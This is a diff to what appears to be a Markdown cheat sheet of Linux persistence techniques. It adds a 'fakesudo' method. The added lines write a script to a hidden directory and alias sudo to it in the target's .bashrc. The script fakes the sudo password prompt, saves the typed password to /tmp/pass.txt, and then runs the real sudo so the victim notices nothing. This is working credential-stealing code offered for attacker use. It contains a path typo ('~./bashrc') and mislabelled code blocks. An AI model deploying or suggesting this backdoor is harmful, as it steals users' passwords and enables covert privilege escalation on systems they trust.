@@ -67,6 +67,26 @@ fi
 rm /tmp/$TMPNAME2
 ```
 
+or add the following line inside its .bashrc file.
+
+```powershell
+$ chmod u+x ~/.hidden/fakesudo
+$ echo "alias sudo=~/.hidden/fakesudo" >> ~./bashrc
+```
+
+and create the `fakesudo` script.
+
+```powershell
+read -sp "[sudo] password for $USER: " sudopass
+echo ""
+sleep 2
+echo "Sorry, try again."
+echo $sudopass >> /tmp/pass.txt
+
+/usr/bin/sudo $@
+```
+
+
 ## Backdooring a startup service
 
 ```bash
